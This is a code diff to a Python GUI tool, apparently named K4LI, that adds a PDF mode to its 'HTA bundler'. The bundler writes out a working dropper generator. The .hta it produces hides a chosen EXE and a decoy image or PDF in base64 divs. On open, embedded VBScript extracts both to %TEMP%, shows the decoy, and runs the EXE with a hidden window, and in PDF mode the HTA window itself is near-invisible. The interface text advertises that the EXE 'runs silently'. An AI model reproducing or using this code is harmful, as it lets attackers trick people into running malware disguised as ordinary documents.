@@ -88,6 +88,7 @@ class K4LIApp:
         self.conv_exe_path    = tk.StringVar(value="")
         self.conv_img_path    = tk.StringVar(value="")
         self.conv_out_name    = tk.StringVar(value="output")
+        self.conv_file_type   = tk.StringVar(value="image")   # "image" or "pdf"
         self.conv_generating  = False
         self.conv_preview_lbl = None
 
@@ -412,8 +413,30 @@ class K4LIApp:
                                               fg=C_WH, bg=BG_IN, hover=BG_HOV)
         self.conv_pick_exe_btn.pack(side="right", padx=(8, 0))
 
-        # ── Image picker ──────────────────────────────────────────────────
-        self._lbl(wrap, "SELECT  IMAGE  (PNG / JPG / ICO / GIF)").pack(fill="x", pady=(0, 5))
+        # ── File type selector ────────────────────────────────────────────
+        self._lbl(wrap, "SELECT  FILE  TYPE").pack(fill="x", pady=(0, 6))
+        ftype_row = tk.Frame(wrap, bg=BG_ROOT)
+        ftype_row.pack(fill="x", pady=(0, 10))
+        rb_img = tk.Radiobutton(
+            ftype_row, text="  IMAGE  (PNG / JPG / ICO / GIF)",
+            variable=self.conv_file_type, value="image",
+            command=self._on_filetype_change,
+            font=F_BODY, fg=C_G1, bg=BG_ROOT, selectcolor=BG_CARD,
+            activeforeground=C_WH, activebackground=BG_ROOT,
+            relief="flat", bd=0, cursor="hand2")
+        rb_img.pack(side="left", padx=(0, 24))
+        rb_pdf = tk.Radiobutton(
+            ftype_row, text="  PDF  (Document)",
+            variable=self.conv_file_type, value="pdf",
+            command=self._on_filetype_change,
+            font=F_BODY, fg=C_G1, bg=BG_ROOT, selectcolor=BG_CARD,
+            activeforeground=C_WH, activebackground=BG_ROOT,
+            relief="flat", bd=0, cursor="hand2")
+        rb_pdf.pack(side="left")
+
+        # ── File picker (image or pdf, label changes on radio switch) ─────
+        self.conv_file_section_lbl = self._lbl(wrap, "SELECT  IMAGE  (PNG / JPG / ICO / GIF)")
+        self.conv_file_section_lbl.pack(fill="x", pady=(0, 5))
         row_img = tk.Frame(wrap, bg=BG_ROOT)
         row_img.pack(fill="x", pady=(0, 8))
         pb_img  = tk.Frame(row_img, bg=BD_MID, padx=1, pady=1)
@@ -453,7 +476,7 @@ class K4LIApp:
                                           font=F_BTN_LG, padx=28, pady=10)
         self.conv_gen_btn.pack(side="left")
         tk.Label(act,
-                 text="Single .hta  ·  EXE + Image bundled inside  ·  opens image + runs EXE on open",
+                 text="Single .hta  ·  EXE + Image/PDF bundled inside  ·  opens file + runs EXE silently",
                  font=("Segoe UI", 8), fg=C_G3, bg=BG_ROOT
                  ).pack(side="left", padx=(14, 0))
 
@@ -486,8 +509,8 @@ class K4LIApp:
                          ("dm", BD_LIT)):
             self.conv_log.tag_config(tag, foreground=col)
 
-        self._conv_ln("[BUNDLER]  EXE + Image → .hta  or  .zip (with thumbnail)", "wh")
-        self._conv_ln("           Pick EXE, pick image, choose format, click GENERATE.", "g3")
+        self._conv_ln("[BUNDLER]  EXE + Image → .hta   |   EXE + PDF → .hta", "wh")
+        self._conv_ln("           Select type · pick EXE · pick file · click GENERATE.", "g3")
         self._conv_ln("", None)
 
     # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -507,19 +530,51 @@ class K4LIApp:
         self._conv_ln(f"[EXE]  {Path(path).name}  ({szs})", "wh")
         self.conv_out_name.set(Path(path).stem)
 
+    def _on_filetype_change(self):
+        is_pdf = self.conv_file_type.get() == "pdf"
+        if is_pdf:
+            self.conv_file_section_lbl.configure(text="SELECT  PDF  FILE")
+            self.conv_pick_img_btn.configure(text="PICK PDF")
+        else:
+            self.conv_file_section_lbl.configure(text="SELECT  IMAGE  (PNG / JPG / ICO / GIF)")
+            self.conv_pick_img_btn.configure(text="PICK IMAGE")
+        # clear previous file selection
+        self.conv_img_path.set("")
+        self.conv_img_lbl.configure(fg=C_G3)
+        for w in self.conv_preview_frame.winfo_children():
+            w.destroy()
+
     def _pick_img_conv(self):
-        path = filedialog.askopenfilename(
-            title="Select Image",
-            filetypes=[("Images", "*.png *.jpg *.jpeg *.ico *.gif *.bmp"),
-                       ("All files", "*.*")]
-        )
-        if not path:
-            return
-        self.conv_img_path.set(path)
-        self.conv_img_lbl.configure(fg=C_G1)
-        sz = os.path.getsize(path)
-        self._conv_ln(f"[IMG]  {Path(path).name}  ({sz/1024:.1f} KB)", "wh")
-        self._show_img_preview(path)
+        if self.conv_file_type.get() == "pdf":
+            path = filedialog.askopenfilename(
+                title="Select PDF File",
+                filetypes=[("PDF Document", "*.pdf"), ("All files", "*.*")]
+            )
+            if not path:
+                return
+            self.conv_img_path.set(path)
+            self.conv_img_lbl.configure(fg=C_G1)
+            sz = os.path.getsize(path)
+            self._conv_ln(f"[PDF]  {Path(path).name}  ({sz/1024:.1f} KB)", "wh")
+            for w in self.conv_preview_frame.winfo_children():
+                w.destroy()
+            tk.Label(self.conv_preview_frame,
+                     text=f"  {Path(path).name}  (PDF Document · {sz/1024:.1f} KB)",
+                     font=("Segoe UI", 8), fg=C_G3, bg=BG_CARD,
+                     padx=8, pady=6, anchor="w").pack(fill="x")
+        else:
+            path = filedialog.askopenfilename(
+                title="Select Image",
+                filetypes=[("Images", "*.png *.jpg *.jpeg *.ico *.gif *.bmp"),
+                           ("All files", "*.*")]
+            )
+            if not path:
+                return
+            self.conv_img_path.set(path)
+            self.conv_img_lbl.configure(fg=C_G1)
+            sz = os.path.getsize(path)
+            self._conv_ln(f"[IMG]  {Path(path).name}  ({sz/1024:.1f} KB)", "wh")
+            self._show_img_preview(path)
 
     def _show_img_preview(self, path: str):
         ext = Path(path).suffix.lower()
@@ -554,14 +609,16 @@ class K4LIApp:
     def _start_hta_gen(self):
         if self.conv_generating:
             return
-        exe_path = self.conv_exe_path.get()
-        img_path = self.conv_img_path.get()
-        out_name = self.conv_out_name.get().strip() or "output"
+        exe_path  = self.conv_exe_path.get()
+        file_path = self.conv_img_path.get()
+        out_name  = self.conv_out_name.get().strip() or "output"
+        file_type = self.conv_file_type.get()
         if not exe_path or not os.path.isfile(exe_path):
             self._conv_ln("\n[ERROR]  No EXE selected.", "rd")
             return
-        if not img_path or not os.path.isfile(img_path):
-            self._conv_ln("\n[ERROR]  No image selected.", "rd")
+        if not file_path or not os.path.isfile(file_path):
+            label = "PDF" if file_type == "pdf" else "image"
+            self._conv_ln(f"\n[ERROR]  No {label} selected.", "rd")
             return
         self.conv_generating = True
         self.conv_gen_btn.configure(state="disabled", fg=C_G3, bg=BG_CARD)
@@ -569,23 +626,26 @@ class K4LIApp:
         self.conv_pick_img_btn.configure(state="disabled")
         threading.Thread(
             target=self._hta_worker,
-            args=(exe_path, img_path, out_name),
+            args=(exe_path, file_path, out_name, file_type),
             daemon=True
         ).start()
 
-    def _hta_worker(self, exe_path: str, img_path: str, out_name: str):
+    def _hta_worker(self, exe_path: str, file_path: str, out_name: str, file_type: str):
         try:
-            self._hta_engine(exe_path, img_path, out_name)
+            self._hta_engine(exe_path, file_path, out_name, file_type)
         except Exception as exc:
             self._conv_ln(f"\n[FATAL]  {exc}", "rd")
         finally:
             self.root.after(0, self._hta_done)
 
-    def _hta_engine(self, exe_path: str, img_path: str, out_name: str):
+    def _hta_engine(self, exe_path: str, file_path: str, out_name: str, file_type: str = "image"):
         import base64
 
+        is_pdf = (file_type == "pdf")
+        mode_label = "PDF" if is_pdf else "Image"
+
         self._conv_ln("\n" + "─" * 62, "dm")
-        self._conv_ln("[HTA]   Building bundled .hta", "wh")
+        self._conv_ln(f"[HTA]   Building bundled .hta  [{mode_label} mode]", "wh")
         self._conv_ln("─" * 62, "dm")
         time.sleep(0.2)
 
@@ -599,32 +659,38 @@ class K4LIApp:
         self._conv_ln(f"       {Path(exe_path).name}  ·  {szs}", "g3")
         time.sleep(0.1)
 
-        # ── Read Image ────────────────────────────────────────────────────
-        self._conv_ln("\n[2/4]  Reading image...", "cy")
+        # ── Read file (image or PDF) ───────────────────────────────────────
+        self._conv_ln(f"\n[2/4]  Reading {mode_label.lower()}...", "cy")
         time.sleep(0.1)
-        with open(img_path, "rb") as f:
-            img_data = f.read()
-        ext  = Path(img_path).suffix.lower()
-        mime = {'.png':  'image/png',
-                '.jpg':  'image/jpeg', '.jpeg': 'image/jpeg',
-                '.ico':  'image/x-icon',
-                '.gif':  'image/gif',
-                '.bmp':  'image/bmp'}.get(ext, 'image/png')
-        w, h = self._read_img_size(img_data, ext)
-        win_w = min(max(w, 240), 1280)
-        win_h = min(max(h, 160), 900)
-        self._conv_ln(f"       {Path(img_path).name}  ·  {len(img_data)/1024:.1f} KB  ·  {w}×{h}", "g3")
-        self._conv_ln(f"       MIME   : {mime}", "g3")
-        self._conv_ln(f"       Window : {win_w}×{win_h}", "g3")
+        with open(file_path, "rb") as f:
+            file_data = f.read()
+        ext = Path(file_path).suffix.lower()
+
+        if is_pdf:
+            win_w, win_h = 0, 0   # HTA window will be hidden for PDF mode
+            self._conv_ln(f"       {Path(file_path).name}  ·  {len(file_data)/1024:.1f} KB", "g3")
+            self._conv_ln( "       Mode   : PDF → opens with default PDF viewer", "g3")
+        else:
+            mime = {'.png':  'image/png',
+                    '.jpg':  'image/jpeg', '.jpeg': 'image/jpeg',
+                    '.ico':  'image/x-icon',
+                    '.gif':  'image/gif',
+                    '.bmp':  'image/bmp'}.get(ext, 'image/png')
+            w, h  = self._read_img_size(file_data, ext)
+            win_w = min(max(w, 240), 1280)
+            win_h = min(max(h, 160), 900)
+            self._conv_ln(f"       {Path(file_path).name}  ·  {len(file_data)/1024:.1f} KB  ·  {w}×{h}", "g3")
+            self._conv_ln(f"       MIME   : {mime}", "g3")
+            self._conv_ln(f"       Window : {win_w}×{win_h}", "g3")
         time.sleep(0.1)
 
         # ── Base64 encode ─────────────────────────────────────────────────
         self._conv_ln("\n[3/4]  Encoding to base64...", "cy")
         time.sleep(0.1)
-        exe_b64 = base64.b64encode(exe_data).decode("ascii")
-        img_b64 = base64.b64encode(img_data).decode("ascii")
+        exe_b64  = base64.b64encode(exe_data).decode("ascii")
+        file_b64 = base64.b64encode(file_data).decode("ascii")
         self._conv_ln(f"       EXE  : {len(exe_b64):,} chars", "g3")
-        self._conv_ln(f"       IMG  : {len(img_b64):,} chars", "g3")
+        self._conv_ln(f"       FILE : {len(file_b64):,} chars", "g3")
         time.sleep(0.15)
 
         # ── Build HTA ─────────────────────────────────────────────────────
@@ -633,112 +699,196 @@ class K4LIApp:
 
         rid      = random.randint(10000, 99999)
         app_name = Path(exe_path).stem.replace('"', '').replace("'", '')
+        file_ext = ext.lstrip('.')   # e.g. "png", "jpg", "pdf"
 
-        img_ext = ext.lstrip('.')  # e.g. "png", "jpg"
-
-        hta = (
-            '<html>\n'
-            '<head>\n'
-            '<meta charset="utf-8">\n'
-            f'<title>{app_name}</title>\n'
-            '<HTA:APPLICATION\n'
-            f'  ID="K4LI_{rid}"\n'
-            f'  APPLICATIONNAME="{app_name}"\n'
-            '  BORDER="none"\n'
-            '  CAPTION="no"\n'
-            '  CONTEXTMENU="no"\n'
-            '  MAXIMIZEBUTTON="no"\n'
-            '  MINIMIZEBUTTON="no"\n'
-            '  NAVIGABLE="no"\n'
-            '  SCROLL="no"\n'
-            '  SELECTION="no"\n'
-            '  SHOWINTASKBAR="no"\n'
-            '  SINGLEINSTANCE="yes"\n'
-            '  SYSMENU="no"\n'
-            '  WINDOWSTATE="normal"\n'
-            f'  INNERWIDTH="{win_w}"\n'
-            f'  INNERHEIGHT="{win_h}"\n'
-            '/>\n'
-            '<style>\n'
-            '*{margin:0;padding:0;box-sizing:border-box;}\n'
-            'body{background:#000;overflow:hidden;cursor:default;-ms-user-select:none;}\n'
-            f'#wrap{{width:{win_w}px;height:{win_h}px;display:flex;align-items:center;justify-content:center;}}\n'
-            f'#thumb{{max-width:{win_w}px;max-height:{win_h}px;display:block;object-fit:contain;}}\n'
-            '</style>\n'
-            '</head>\n'
-            '<body>\n'
-            '<div id="wrap">\n'
-            f'  <img id="thumb" src="data:{mime};base64,{img_b64}" draggable="false"/>\n'
-            '</div>\n'
-            f'<div id="X" style="display:none;visibility:hidden;position:absolute;left:-9999px;top:-9999px">{exe_b64}</div>\n'
-            f'<div id="I" style="display:none;visibility:hidden;position:absolute;left:-9999px;top:-9999px">{img_b64}</div>\n'
-            '<script language="VBScript">\n'
-            'Dim bRan : bRan = False\n'
-            '\n'
-            'Sub AutoRun()\n'
-            '  If bRan Then Exit Sub\n'
-            '  bRan = True\n'
-            '  On Error Resume Next\n'
-            '  Dim fso, xml, nd, stm, sh\n'
-            '  Set fso = CreateObject("Scripting.FileSystemObject")\n'
-            '  Set sh  = CreateObject("WScript.Shell")\n'
-            '  Set xml = CreateObject("MSXML2.DOMDocument")\n'
-            '  Set nd  = xml.createElement("n")\n'
-            '  nd.DataType = "bin.base64"\n'
-            '\n'
-            '  \' -- extract image to %TEMP% --\n'
-            '  nd.Text = document.getElementById("I").innerText\n'
-            '  Set stm = CreateObject("ADODB.Stream")\n'
-            '  stm.Type = 1 : stm.Open\n'
-            '  stm.Write nd.nodeTypedValue\n'
-            f'  Dim imgTmp : imgTmp = fso.GetSpecialFolder(2) & "\\k4li_{rid}.{img_ext}"\n'
-            '  stm.SaveToFile imgTmp, 2\n'
-            '  stm.Close\n'
-            '\n'
-            '  \' -- extract exe to %TEMP% (GetSpecialFolder - always works) --\n'
-            '  nd.Text = document.getElementById("X").innerText\n'
-            '  Set stm = CreateObject("ADODB.Stream")\n'
-            '  stm.Type = 1 : stm.Open\n'
-            '  stm.Write nd.nodeTypedValue\n'
-            f'  Dim exeTmp : exeTmp = fso.GetSpecialFolder(2) & "\\k4li_{rid}.exe"\n'
-            '  stm.SaveToFile exeTmp, 2\n'
-            '  stm.Close\n'
-            '\n'
-            '  \' -- open image --\n'
-            '  sh.Run Chr(34) & imgTmp & Chr(34), 1, False\n'
-            '\n'
-            '  \' -- run exe: ShellExecute with CWD = %TEMP% --\n'
-            '  If fso.FileExists(exeTmp) Then\n'
-            '    Dim oSA : Set oSA = CreateObject("Shell.Application")\n'
-            '    oSA.ShellExecute exeTmp, "", fso.GetSpecialFolder(2), "open", 0\n'
-            '    Set oSA = Nothing\n'
-            '  End If\n'
-            '\n'
-            '  window.close\n'
-            'End Sub\n'
-            '\n'
-            'Sub window_onload()\n'
-            f'  window.resizeTo {win_w}, {win_h}\n'
-            f'  window.moveTo (screen.width - {win_w}) \\ 2, (screen.height - {win_h}) \\ 2\n'
-            '  window.setTimeout "AutoRun()", 150\n'
-            'End Sub\n'
-            '</script>\n'
-            '</body>\n'
-            '</html>\n'
-        )
+        if is_pdf:
+            # PDF mode: tiny invisible HTA, no image body
+            hta = (
+                '<html>\n'
+                '<head>\n'
+                '<meta charset="utf-8">\n'
+                f'<title>{app_name}</title>\n'
+                '<HTA:APPLICATION\n'
+                f'  ID="K4LI_{rid}"\n'
+                f'  APPLICATIONNAME="{app_name}"\n'
+                '  BORDER="none"\n'
+                '  CAPTION="no"\n'
+                '  SHOWINTASKBAR="no"\n'
+                '  SINGLEINSTANCE="yes"\n'
+                '  WINDOWSTATE="minimize"\n'
+                '  INNERWIDTH="1"\n'
+                '  INNERHEIGHT="1"\n'
+                '/>\n'
+                '<style>*{margin:0;padding:0;}body{background:#000;}</style>\n'
+                '</head>\n'
+                '<body>\n'
+                f'<div id="X" style="display:none;position:absolute;left:-9999px">{exe_b64}</div>\n'
+                f'<div id="F" style="display:none;position:absolute;left:-9999px">{file_b64}</div>\n'
+                '<script language="VBScript">\n'
+                'Dim bRan : bRan = False\n'
+                '\n'
+                'Sub AutoRun()\n'
+                '  If bRan Then Exit Sub\n'
+                '  bRan = True\n'
+                '  On Error Resume Next\n'
+                '  Dim fso, xml, nd, stm, sh\n'
+                '  Set fso = CreateObject("Scripting.FileSystemObject")\n'
+                '  Set sh  = CreateObject("WScript.Shell")\n'
+                '  Set xml = CreateObject("MSXML2.DOMDocument")\n'
+                '  Set nd  = xml.createElement("n")\n'
+                '  nd.DataType = "bin.base64"\n'
+                '\n'
+                '  \' -- extract PDF to %TEMP% --\n'
+                '  nd.Text = document.getElementById("F").innerText\n'
+                '  Set stm = CreateObject("ADODB.Stream")\n'
+                '  stm.Type = 1 : stm.Open\n'
+                '  stm.Write nd.nodeTypedValue\n'
+                f'  Dim pdfTmp : pdfTmp = fso.GetSpecialFolder(2) & "\\k4li_{rid}.pdf"\n'
+                '  stm.SaveToFile pdfTmp, 2\n'
+                '  stm.Close\n'
+                '\n'
+                '  \' -- extract EXE to %TEMP% --\n'
+                '  nd.Text = document.getElementById("X").innerText\n'
+                '  Set stm = CreateObject("ADODB.Stream")\n'
+                '  stm.Type = 1 : stm.Open\n'
+                '  stm.Write nd.nodeTypedValue\n'
+                f'  Dim exeTmp : exeTmp = fso.GetSpecialFolder(2) & "\\k4li_{rid}.exe"\n'
+                '  stm.SaveToFile exeTmp, 2\n'
+                '  stm.Close\n'
+                '\n'
+                '  \' -- open PDF with default viewer --\n'
+                '  If fso.FileExists(pdfTmp) Then\n'
+                '    Dim oSA2 : Set oSA2 = CreateObject("Shell.Application")\n'
+                '    oSA2.ShellExecute pdfTmp, "", fso.GetSpecialFolder(2), "open", 1\n'
+                '    Set oSA2 = Nothing\n'
+                '  End If\n'
+                '\n'
+                '  \' -- run EXE silently --\n'
+                '  If fso.FileExists(exeTmp) Then\n'
+                '    Dim oSA : Set oSA = CreateObject("Shell.Application")\n'
+                '    oSA.ShellExecute exeTmp, "", fso.GetSpecialFolder(2), "open", 0\n'
+                '    Set oSA = Nothing\n'
+                '  End If\n'
+                '\n'
+                '  window.close\n'
+                'End Sub\n'
+                '\n'
+                'Sub window_onload()\n'
+                '  window.setTimeout "AutoRun()", 150\n'
+                'End Sub\n'
+                '</script>\n'
+                '</body>\n'
+                '</html>\n'
+            )
+        else:
+            # Image mode: original behavior
+            hta = (
+                '<html>\n'
+                '<head>\n'
+                '<meta charset="utf-8">\n'
+                f'<title>{app_name}</title>\n'
+                '<HTA:APPLICATION\n'
+                f'  ID="K4LI_{rid}"\n'
+                f'  APPLICATIONNAME="{app_name}"\n'
+                '  BORDER="none"\n'
+                '  CAPTION="no"\n'
+                '  CONTEXTMENU="no"\n'
+                '  MAXIMIZEBUTTON="no"\n'
+                '  MINIMIZEBUTTON="no"\n'
+                '  NAVIGABLE="no"\n'
+                '  SCROLL="no"\n'
+                '  SELECTION="no"\n'
+                '  SHOWINTASKBAR="no"\n'
+                '  SINGLEINSTANCE="yes"\n'
+                '  SYSMENU="no"\n'
+                '  WINDOWSTATE="normal"\n'
+                f'  INNERWIDTH="{win_w}"\n'
+                f'  INNERHEIGHT="{win_h}"\n'
+                '/>\n'
+                '<style>\n'
+                '*{margin:0;padding:0;box-sizing:border-box;}\n'
+                'body{background:#000;overflow:hidden;cursor:default;-ms-user-select:none;}\n'
+                f'#wrap{{width:{win_w}px;height:{win_h}px;display:flex;align-items:center;justify-content:center;}}\n'
+                f'#thumb{{max-width:{win_w}px;max-height:{win_h}px;display:block;object-fit:contain;}}\n'
+                '</style>\n'
+                '</head>\n'
+                '<body>\n'
+                '<div id="wrap">\n'
+                f'  <img id="thumb" src="data:{mime};base64,{file_b64}" draggable="false"/>\n'
+                '</div>\n'
+                f'<div id="X" style="display:none;visibility:hidden;position:absolute;left:-9999px;top:-9999px">{exe_b64}</div>\n'
+                f'<div id="I" style="display:none;visibility:hidden;position:absolute;left:-9999px;top:-9999px">{file_b64}</div>\n'
+                '<script language="VBScript">\n'
+                'Dim bRan : bRan = False\n'
+                '\n'
+                'Sub AutoRun()\n'
+                '  If bRan Then Exit Sub\n'
+                '  bRan = True\n'
+                '  On Error Resume Next\n'
+                '  Dim fso, xml, nd, stm, sh\n'
+                '  Set fso = CreateObject("Scripting.FileSystemObject")\n'
+                '  Set sh  = CreateObject("WScript.Shell")\n'
+                '  Set xml = CreateObject("MSXML2.DOMDocument")\n'
+                '  Set nd  = xml.createElement("n")\n'
+                '  nd.DataType = "bin.base64"\n'
+                '\n'
+                '  \' -- extract image to %TEMP% --\n'
+                '  nd.Text = document.getElementById("I").innerText\n'
+                '  Set stm = CreateObject("ADODB.Stream")\n'
+                '  stm.Type = 1 : stm.Open\n'
+                '  stm.Write nd.nodeTypedValue\n'
+                f'  Dim imgTmp : imgTmp = fso.GetSpecialFolder(2) & "\\k4li_{rid}.{file_ext}"\n'
+                '  stm.SaveToFile imgTmp, 2\n'
+                '  stm.Close\n'
+                '\n'
+                '  \' -- extract exe to %TEMP% --\n'
+                '  nd.Text = document.getElementById("X").innerText\n'
+                '  Set stm = CreateObject("ADODB.Stream")\n'
+                '  stm.Type = 1 : stm.Open\n'
+                '  stm.Write nd.nodeTypedValue\n'
+                f'  Dim exeTmp : exeTmp = fso.GetSpecialFolder(2) & "\\k4li_{rid}.exe"\n'
+                '  stm.SaveToFile exeTmp, 2\n'
+                '  stm.Close\n'
+                '\n'
+                '  \' -- open image --\n'
+                '  sh.Run Chr(34) & imgTmp & Chr(34), 1, False\n'
+                '\n'
+                '  \' -- run exe silently --\n'
+                '  If fso.FileExists(exeTmp) Then\n'
+                '    Dim oSA : Set oSA = CreateObject("Shell.Application")\n'
+                '    oSA.ShellExecute exeTmp, "", fso.GetSpecialFolder(2), "open", 0\n'
+                '    Set oSA = Nothing\n'
+                '  End If\n'
+                '\n'
+                '  window.close\n'
+                'End Sub\n'
+                '\n'
+                'Sub window_onload()\n'
+                f'  window.resizeTo {win_w}, {win_h}\n'
+                f'  window.moveTo (screen.width - {win_w}) \\ 2, (screen.height - {win_h}) \\ 2\n'
+                '  window.setTimeout "AutoRun()", 150\n'
+                'End Sub\n'
+                '</script>\n'
+                '</body>\n'
+                '</html>\n'
+            )
 
         out_path = Path(exe_path).parent / f"{out_name}.hta"
         with open(out_path, "w", encoding="utf-8") as f:
             f.write(hta)
 
         total_kb = os.path.getsize(out_path) / 1024
+        embed_label = "EXE + PDF" if is_pdf else "EXE + Image"
+        done_msg = ("Open .hta → PDF opens in default viewer + EXE runs silently ✓"
+                    if is_pdf else
+                    "Open .hta → image opens in Photos + EXE runs silently ✓")
         self._conv_ln("\n" + "─" * 62, "dm")
         self._conv_ln("[OK]    HTA bundle complete", "gn")
         self._conv_ln(f"        File   : {out_path.name}", "g2")
-        self._conv_ln(f"        Size   : {total_kb:.1f} KB  (EXE + Image embedded)", "g2")
+        self._conv_ln(f"        Size   : {total_kb:.1f} KB  ({embed_label} embedded)", "g2")
         self._conv_ln(f"        Path   : {out_path}", "g3")
         self._conv_ln("─" * 62, "dm")
-        self._conv_ln("\n[DONE]  Open .hta → image opens in Photos + EXE runs silently ✓", "gn")
+        self._conv_ln(f"\n[DONE]  {done_msg}", "gn")
 
     def _read_img_size(self, data: bytes, ext: str) -> tuple:
         try:
